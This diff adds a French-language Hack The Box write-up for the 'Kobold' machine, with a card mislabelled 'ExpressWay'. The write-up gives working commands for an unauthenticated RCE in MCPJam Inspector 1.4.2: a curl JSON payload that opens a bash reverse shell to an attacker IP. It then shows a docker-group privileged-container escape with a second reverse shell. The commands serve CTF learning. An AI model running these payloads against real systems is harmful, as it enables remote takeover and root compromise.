@@ -206,6 +206,299 @@ header p{margin:0 0 16px;color:rgba(219,239,255,0.9)}
       <section class="platform-section">
         <h2>Hack The Box</h2>
 
+		<article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">ExpressWay - Easy</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
+---
+layout: post
+title: "HTB — Kobold"
+date: 2026-04-25
+author: n40y
+ctf: HackTheBox
+category: Linux
+difficulty: Easy
+points: 0
+ip: "10.129.245.50"
+tools:
+  - nmap
+  - rustscan
+  - ffuf
+  - nuclei
+  - curl
+  - netcat
+  - docker
+tags:
+  - mcp
+  - rce
+  - docker-escape
+  - vhost-fuzzing
+  - command-injection
+---
+
+## Contexte
+
+> Kobold est une machine Linux de difficulté **Easy** sur HackTheBox.  
+> L'accès initial repose sur une RCE non authentifiée dans **MCPJam Inspector v1.4.2**,  
+> et l'escalade de privilèges exploite l'appartenance au groupe **docker** pour s'échapper du container et lire le flag root.
+
+**IP cible :** `10.129.245.50`  
+**OS :** Ubuntu 24.04 (OpenSSH 9.6p1)
+
+---
+
+## Reconnaissance
+
+### Scan de ports
+
+Je commence avec rustscan pour un scan rapide, puis nmap pour les détails de service.
+
+```bash
+rustscan -a 10.129.245.50 -u 5000
+```
+
+```
+Open 10.129.245.50:22
+Open 10.129.245.50:80
+Open 10.129.245.50:443
+```
+
+Rustscan rate le port non-standard. Je refais un scan complet :
+
+```bash
+nmap -sC -sV -p- -O 10.129.245.50
+```
+
+```
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu-3ubuntu13.15
+80/tcp   open  http     nginx 1.24.0
+443/tcp  open  https    nginx 1.24.0
+3552/tcp open  http     Golang net/http server
+```
+
+**Port 3552** — identifié par nmap comme `taserver`, mais c'est en réalité une webapp Go avec un frontend SvelteKit. Ce port est le vrai point d'entrée.
+
+```bash
+curl -v http://kobold.htb:3552/api
+```
+
+La réponse retourne une page HTML SvelteKit complète. Le service tourne sur Go, pas sur le prétendu TASserver. Piste intéressante : fouiller l'API.
+
+### Scan de vulnérabilités passives
+
+```bash
+nuclei -target http://kobold.htb
+```
+
+Résultats notables :
+
+- Nginx 1.24.0 (EOL)
+- SSH accepte `publickey` et `password`
+- En-têtes de sécurité HTTP absents (`CSP`, `X-Frame-Options`, `HSTS`...)
+- Aucune CVE critique détectée côté HTTP directement
+
+### Virtual Host Fuzzing
+
+```bash
+ffuf -c -u https://kobold.htb \
+     -H "Host: FUZZ.kobold.htb" \
+     -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+     -fc 302,403,404 -k
+```
+
+```
+mcp   [Status: 200, Size: 466]
+bin   [Status: 200, Size: 24402]
+```
+
+Deux sous-domaines trouvés :
+
+- `mcp.kobold.htb` → **MCPJam Inspector v1.4.2** — c'est le point d'entrée principal
+- `bin.kobold.htb` → PrivateBin — intéressant pour la post-exploitation, pas pour l'accès initial
+
+```bash
+echo "10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
+```
+
+### Fuzzing de l'API (port 3552)
+
+```bash
+ffuf -u http://kobold.htb:3552/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+     -c -fc 200
+```
+
+```
+api/docs/          [Status: 301]
+api/events         [Status: 401]
+api/users/current  [Status: 401]
+api/users/login    [Status: 401]
+```
+
+Les endpoints d'authentification existent, mais l'accès initial passera par MCPJam, pas par là.
+
+---
+
+## Exploitation — RCE non authentifiée (CVE-2026-23744)
+
+**MCPJam Inspector** est un outil d'inspection de serveurs MCP (Model Context Protocol). La version 1.4.2 expose un endpoint `/api/mcp/connect` qui accepte une configuration de serveur arbitraire — y compris la commande à exécuter — sans aucune authentification.
+
+### Listener
+
+```bash
+nc -lvnp 4444
+```
+
+### Déclenchement du reverse shell
+
+```bash
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "serverId": "pwn",
+    "serverConfig": {
+      "command": "bash",
+      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1"],
+      "env": {}
+    }
+  }'
+```
+
+Le serveur exécute la commande sans valider le champ `command`. Connexion obtenue immédiatement :
+
+```
+connect to [10.10.14.153] from (UNKNOWN) [10.129.245.50] 43680
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
+```
+
+### Stabilisation du shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+export SHELL=/bin/bash
+stty rows $(tput lines) columns $(tput cols)
+```
+
+### Flag utilisateur
+
+```bash
+cat /home/ben/user.txt
+```
+
+```
+flag_user{****************************}
+```
+
+---
+
+## Escalade de privilèges — Docker Escape
+
+### Énumération des groupes
+
+```bash
+id
+```
+
+```
+uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+```
+
+`ben` appartient au groupe **docker**. C'est une voie d'escalade classique : un utilisateur membre de ce groupe peut lancer des containers avec des privilèges root, monter le système de fichiers hôte, et s'échapper complètement.
+
+```bash
+docker images
+```
+
+```
+REPOSITORY                    TAG       IMAGE ID
+mysql                         latest    f66b7a288113
+privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
+```
+
+L'image `mysql:latest` est disponible localement. Pas besoin de pull.
+
+### Étape 1 — Shell root dans un premier container
+
+```bash
+# Listener sur la machine d'attaque
+nc -lvnp 5555
+```
+
+```bash
+# Depuis le shell ben
+docker run --rm --privileged -v /:/host-root mysql:latest \
+  /bin/bash -c 'chroot /host-root /bin/bash -i >& /dev/tcp/10.10.14.153/5555 0>&1'
+```
+
+```
+root@d88307b47189:/#
+```
+
+Shell root obtenu — mais c'est encore à l'intérieur d'un container. Le montage `/host-root` n'est pas accessible tel quel.
+
+### Étape 2 — Lecture directe du flag root
+
+La méthode la plus propre : monter le système hôte et lire directement le fichier sans passer par un shell intermédiaire.
+
+```bash
+docker run --rm --privileged \
+  -v /:/hostfs \
+  --entrypoint cat mysql:latest \
+  /hostfs/root/root.txt
+```
+
+```
+flag_root{****************************}
+```
+
+---
+
+## Flags
+
+```
+user.txt  →  htb{****************************}
+root.txt  →  htb{****************************}
+```
+
+---
+
+## Chaîne d'attaque
+
+| Phase | Technique | Outil | Vulnérabilité |
+|---|---|---|---|
+| Reconnaissance | Port scan complet | nmap / rustscan | — |
+| Énumération | Virtual Host fuzzing | ffuf | Nginx vhost misconfig |
+| Énumération | API fuzzing | ffuf | Endpoints non documentés |
+| Accès initial | RCE via JSON command injection | curl | CVE-2026-23744 (MCPJam 1.4.2) |
+| Post-exploitation | Stabilisation du shell | python3 pty | — |
+| Élévation de privilèges | Docker privileged + chroot | docker CLI | Groupe `operator` → accès Docker |
+
+---
+
+## Ce que j'ai appris
+
+**Ne pas ignorer les ports non-standards.** Rustscan avait raté le 3552 dans son scan rapide, et nmap l'avait identifié comme `taserver` — un faux positif. Un scan `-p-` est indispensable.
+
+**Le VHOST fuzzing révèle l'essentiel.** Le port 3552 et son API Go semblaient être le point d'entrée évident. Le vrai chemin était caché derrière `mcp.kobold.htb`, invisible sans fuzzing DNS.
+
+**Les endpoints JSON d'outils de dev exposent souvent une RCE triviale.** MCPJam est conçu pour connecter des serveurs MCP en passant une commande — fonctionnalité légitime, mais catastrophique sans auth.
+
+**`docker` dans les groupes = root.** L'appartenance à ce groupe est équivalente à sudo sans mot de passe sur n'importe quelle machine avec Docker installé. À checker systématiquement dans `id`.
+
+---
+
+## Ressources
+
+- [MCPJam Inspector — GitHub](https://github.com/mcpjam/inspector)
+- [HackTricks — Docker Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
+- [PortSwigger — Command Injection](https://portswigger.net/web-security/os-command-injection)
+		
+			</script>
+          </div>
+        </article>
+
         <article class="writeup-item">
           <h3 class="clickable"><span class="title-text">ExpressWay - Easy</span></h3>
           <div class="writeup-content" aria-hidden="true">
